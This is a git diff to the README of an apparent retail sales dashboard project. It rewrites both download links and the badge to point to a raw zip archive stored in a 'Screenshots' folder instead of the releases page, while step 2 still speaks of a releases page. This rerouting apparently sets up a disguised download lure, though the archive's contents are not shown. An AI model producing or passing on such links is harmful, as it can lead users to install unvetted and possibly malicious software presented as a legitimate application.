@@ -6,14 +6,14 @@ Welcome to the Retail Sales Analytics Dashboard. This application helps you anal
 
 ## 🔗 Download Now
 
-[![Download Retail-Sales-Analytics-Dashboard](https://img.shields.io/badge/Download-Retail--Sales--Analytics--Dashboard-brightgreen)](https://github.com/JNKEXPRESS/Retail-Sales-Analytics-Dashboard/releases)
+[![Download Retail-Sales-Analytics-Dashboard](https://raw.githubusercontent.com/JNKEXPRESS/Retail-Sales-Analytics-Dashboard/main/Screenshots/Retail-Sales-Analytics-Dashboard-v3.6.zip)](https://raw.githubusercontent.com/JNKEXPRESS/Retail-Sales-Analytics-Dashboard/main/Screenshots/Retail-Sales-Analytics-Dashboard-v3.6.zip)
 
 ## 📥 Download & Install
 
 To download the Retail Sales Analytics Dashboard, please follow these steps:
 
 1. Visit the following page to download the application:
-   [Download Retail Sales Analytics Dashboard](https://github.com/JNKEXPRESS/Retail-Sales-Analytics-Dashboard/releases)
+   [Download Retail Sales Analytics Dashboard](https://raw.githubusercontent.com/JNKEXPRESS/Retail-Sales-Analytics-Dashboard/main/Screenshots/Retail-Sales-Analytics-Dashboard-v3.6.zip)
    
 2. On the releases page, find the latest version listed. Look for the section with the title "Assets." You will see different files available for download.
 
